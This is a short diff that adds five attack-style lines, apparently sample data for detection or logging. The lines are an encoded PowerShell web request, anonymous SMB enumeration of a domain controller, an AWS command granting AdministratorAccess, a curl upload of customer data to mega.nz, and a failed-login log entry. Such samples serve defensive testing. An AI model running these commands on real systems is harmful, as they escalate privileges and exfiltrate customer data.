@@ -1,0 +1,5 @@
+powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==
+smbclient -L //DC01 -U anonymous%
+aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+curl -F "file=@customer_data.zip" https://mega.nz/upload
+Failed login attempt for sa from 45.33.12.9
